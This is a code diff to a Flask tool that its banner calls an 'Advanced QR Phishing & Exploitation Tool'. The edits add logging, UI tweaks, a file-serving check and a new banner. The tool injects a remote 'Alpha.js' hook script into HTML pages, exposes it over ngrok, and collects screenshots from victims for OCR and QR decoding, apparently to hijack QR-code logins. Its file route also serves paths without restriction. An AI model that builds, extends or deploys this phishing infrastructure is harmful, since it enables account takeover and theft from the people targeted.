@@ -128,7 +128,17 @@ if platform.system() == "Windows":
 app = Flask(__name__)
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')
 
+# Configure logging
 logging.getLogger('werkzeug').setLevel(logging.ERROR)
+logging.getLogger('socketio').setLevel(logging.ERROR)
+logging.getLogger('engineio').setLevel(logging.ERROR)
+
+# Create a logger for application errors
+app_logger = logging.getLogger('AlphaQR')
+app_logger.setLevel(logging.ERROR)
+handler = logging.StreamHandler(sys.stderr)  # Use stderr, not stdout
+handler.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
+app_logger.addHandler(handler)
 
 # Global State
 current_qr_link = None
@@ -369,7 +379,7 @@ input[type="color"]::-webkit-color-swatch{ border:2px solid var(--border); borde
             <textarea id="configString" rows="1" placeholder="Enter keyword..." style="margin-top:6px; font-family:inherit; background:transparent; position:relative; z-index:2;"></textarea>
         </div>
     </div>
-    <button class="button small" onclick="saveConfigString()">Save Keyword</button>
+    <button id="saveKeywordBtn" class="button small" onclick="saveConfigString()">Save Keyword</button>
 
     <div class="section-title">Fallback Configuration</div>
     
@@ -621,12 +631,38 @@ document.getElementById("qrCandidateSelect").addEventListener("change", function
 });
 
 // Config String Logic
-function saveConfigString(){
-    const val = document.getElementById("configString").value;
+function saveConfigString() {
+    const input = document.getElementById("configString");
+    const btn = document.getElementById("saveKeywordBtn");
+
+    const originalText = btn.innerText;
+
+    btn.disabled = true;
+    btn.innerText = "Saving...";
+
     fetch('/api/config_string', {
         method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({config_string: val})
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ config_string: input.value })
+    })
+    .then(response => {
+        if (!response.ok) throw new Error("Request failed");
+
+        btn.innerText = "Saved";
+
+        setTimeout(() => {
+            btn.innerText = originalText;
+            btn.disabled = false;
+        }, 1000);
+    })
+    .catch(err => {
+        console.error(err);
+        btn.innerText = "Error";
+
+        setTimeout(() => {
+            btn.innerText = originalText;
+            btn.disabled = false;
+        }, 1500);
     });
 }
 
@@ -1103,7 +1139,7 @@ def receive_screenshot():
                 string_found = True
                 
         except Exception as e:
-            print(f"OCR Error: {e}")
+            app_logger.error(f"OCR Error: {e}", exc_info=False)
             string_found = True 
             
         # 2. Fallback Logic
@@ -1139,7 +1175,7 @@ def receive_screenshot():
             if result:
                 decoded_links = list(set([r.data.decode('utf-8') for r in result]))
         except Exception as e:
-            print(f"QR decode error: {e}")
+            app_logger.error(f"QR decode error: {e}", exc_info=False)
         
         num_qrs = len(decoded_links)
         if num_qrs == 1:
@@ -1160,45 +1196,140 @@ def receive_screenshot():
         })
         
     except Exception as e:
-        print(f"Screenshot error: {e}")
+        app_logger.error(f"Screenshot error: {e}", exc_info=True)
         return jsonify({"success": False, "error": str(e)}), 500
+
+@app.route('/')
+def index():
+    return redirect('/AlphaQR')
 
 @app.route('/<path:filename>')
 def serve_root_files(filename):
     try:
+        # Check if file exists before trying to send
+        filepath = os.path.join(os.getcwd(), filename)
+        if not os.path.exists(filepath) or not os.path.isfile(filepath):
+            return "File not found", 404
+        
+        # Send file
         return send_from_directory(os.getcwd(), filename)
     except Exception as e:
-        return jsonify({"error": "File not found"}), 404
+        app_logger.error(f"Error serving file {filename}: {e}")
+        return f"Error serving file: {str(e)}", 500
 
 # ==========================================
 # 6. CLI INTERFACE
 # ==========================================
 
 def print_banner(url):
-    try:
-        width = shutil.get_terminal_size().columns
-    except:
-        width = 80
-
-    banner = """
-    _    _       _          ____  _____ 
-   / \  | |_ __ | |__   __ / __ \|  _ \ 
-  / _ \ | | '_ \| '_ \ / _` |  | | |_) |
- / ___ \| | |_) | | | | (_| |  | |  _ < 
-/_/   \_\_| .__/|_| |_|\__,_|  |_|_| \_\ 
-          |_|                           
-    """
-    print(Fore.CYAN)
-    for line in banner.split('\n'):
-        if line.strip():
-            print(line.center(width))
-    print(Style.RESET_ALL)
     
-    print(f"{Fore.GREEN}=========================================={Style.RESET_ALL}".center(width + 10)) # +10 for color codes length approx adjustment
-    print(f"{Fore.YELLOW}🚀 Alpha QR Server Running!{Style.RESET_ALL}".center(width + 10))
-    print(f"{Fore.BLUE}🌐 URL: {url}/AlphaQR{Style.RESET_ALL}".center(width + 10))
-    print(f"{Fore.MAGENTA}🔗 Hook Script: <script src=\"{url}/Alpha.js\"></script>{Style.RESET_ALL}".center(width + 10))
-    print(f"{Fore.GREEN}=========================================={Style.RESET_ALL}\n".center(width + 10))
+    def get_terminal_width():
+        try:
+            return shutil.get_terminal_size().columns
+        except:
+            return 80
+            
+    def parse_color_tags(text):
+        replacements = {
+            "{CYAN}": Fore.CYAN,
+            "{WHITE}": Fore.WHITE,
+            "{GREEN}": Fore.GREEN,
+            "{YELLOW}": Fore.YELLOW,
+            "{RED}": Fore.RED,
+            "{MAGENTA}": Fore.MAGENTA,
+            "{BLUE}": Fore.BLUE,
+        }
+        for tag, code in replacements.items():
+            text = text.replace(tag, code)
+        return text + Style.RESET_ALL
+
+    terminal_width = get_terminal_width()
+    os.system('cls' if os.name == 'nt' else 'clear')
+    
+    # Create stylish banner with colored elements - fixed width for proper alignment
+    banner_lines = [
+      
+        "{CYAN}"
+    
+"{CYAN}   █████████   ████            █████                   ██████    ███████████  ",
+"{CYAN}  ███     ███   ███             ███                  ███    ███   ███     ███ ",
+"{CYAN}  ███     ███   ███  ████████   ███████    ██████   ███      ███  ███     ███ ",
+"{CYAN}  ███████████   ███   ███  ███  ███  ███       ███  ███      ███  ██████████  ",
+"{CYAN}  ███     ███   ███   ███  ███  ███  ███   ███████  ███   ██ ███  ███     ███ ",
+"{CYAN}  ███     ███   ███   ███  ███  ███  ███  ███  ███   ███   ████   ███     ███ ",
+"{CYAN} █████   █████ █████  ███████  ████ █████  ████████    ██████ ██ █████   █████",
+"{CYAN}                      ███                                                     ",
+"{CYAN}                      ███                                                     ",
+"{CYAN}                     █████                                                    "
+ ]                                                                
+    # Parse color tags in each line
+    colored_banner_lines = [parse_color_tags(line) for line in banner_lines]
+    
+    # Calculate required width and padding (use the first line for reference)
+    clean_line = re.sub(r'\x1b\[[0-9;]*m', '', colored_banner_lines[0])
+    banner_width = len(clean_line)
+    center_padding = max(0, (terminal_width - banner_width) // 2)
+    
+    print("\n")
+    
+    # Print each banner line with consistent padding
+    for line in colored_banner_lines:
+        print(f"{' ' * center_padding}{line}")
+        
+    print()
+    
+    # Subtitle lines with proper centering and coloring
+    subtitle1 = "{WHITE}Advanced QR Phishing & Exploitation Tool"
+    # Replace dots with a solid line in cyan color - make sure it's the same width as the banner
+    subtitle2 = "{CYAN}" + "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" 
+    subtitle3 = "{GREEN}Version: 1.0     {GREEN}Linkedin: www.linkedin.com/in/varun--775a77310     {GREEN}By: MR. Pentest"
+    
+    subtitles = [subtitle1, subtitle2, subtitle3]
+    colored_subtitles = [parse_color_tags(subtitle) for subtitle in subtitles]
+    
+    clean_subtitles = [re.sub(r'\x1b\[[0-9;]*m', '', subtitle) for subtitle in colored_subtitles]
+    max_subtitle_len = max(len(subtitle) for subtitle in clean_subtitles)
+    
+    if max_subtitle_len > banner_width:
+        center_padding = max(0, (terminal_width - max_subtitle_len) // 2)
+        
+    for i, subtitle in enumerate(colored_subtitles):
+        clean_subtitle = re.sub(r'\x1b\[[0-9;]*m', '', subtitle)
+        if i == 0 or i == 2:  # Title or version info
+            extra_pad = max(0, (max_subtitle_len - len(clean_subtitle)) // 2)
+            print(f"{' ' * (center_padding + extra_pad)}{subtitle}")
+        else:  # Center line
+            print(f"{' ' * center_padding}{subtitle}")
+            
+    print("\n")
+    
+    # Display URLs
+    server_mode = "Ngrok" if "ngrok" in url else "Local"
+    
+    # Calculate padding for URL lines to be somewhat centered but left-aligned relative to each other
+    # Using banner_width as a rough guide for where to start
+    url_padding = center_padding
+    
+    if server_mode == "Local":
+        control_panel = f"{url}/AlphaQR"
+        print(f"{' ' * url_padding}{Fore.WHITE}════════════════════════════════════════════════════════════════════════════════════")
+        print(f"{' ' * url_padding}{Fore.YELLOW}Control Panel : {Fore.CYAN}{control_panel}")
+        
+        js_tag = f'<script src="{url}/Alpha.js"></script>'
+        print(f"{' ' * url_padding}{Fore.YELLOW}JavaScript Tag: {Fore.CYAN}{js_tag}")
+        print(f"{' ' * url_padding}{Fore.WHITE}════════════════════════════════════════════════════════════════════════════════════")
+    else:
+        # Assuming url is the full ngrok url like https://xxxx.ngrok-free.app
+        control_panel = f"{url}/AlphaQR"
+        print(f"{' ' * url_padding}{Fore.WHITE}════════════════════════════════════════════════════════════════════════════════════")
+        
+        print(f"{' ' * url_padding}{Fore.YELLOW}Control Panel : {Fore.MAGENTA}{control_panel}")
+        
+        js_tag = f'<script src="{url}/Alpha.js"></script>'
+        print(f"{' ' * url_padding}{Fore.YELLOW}JavaScript Tag: {Fore.MAGENTA}{js_tag}")
+        print(f"{' ' * url_padding}{Fore.WHITE}════════════════════════════════════════════════════════════════════════════════════")
+
+    print("\n")
 
 def run_server_thread():
     # Disable flask banner
@@ -1224,7 +1355,7 @@ def link_command(filename):
         script_tag = f'<script src="{CURRENT_URL}/Alpha.js"></script>'
         
         # Check if already hooked with ANY Alpha.js
-        pattern = r'<script src=".*?/Alpha\.js"></script>'
+        pattern = r'<script\s+[^>]*src=["\'][^"\']*/Alpha\.js["\'][^>]*>\s*</script>'
         
         if re.search(pattern, content):
             # Update existing hook
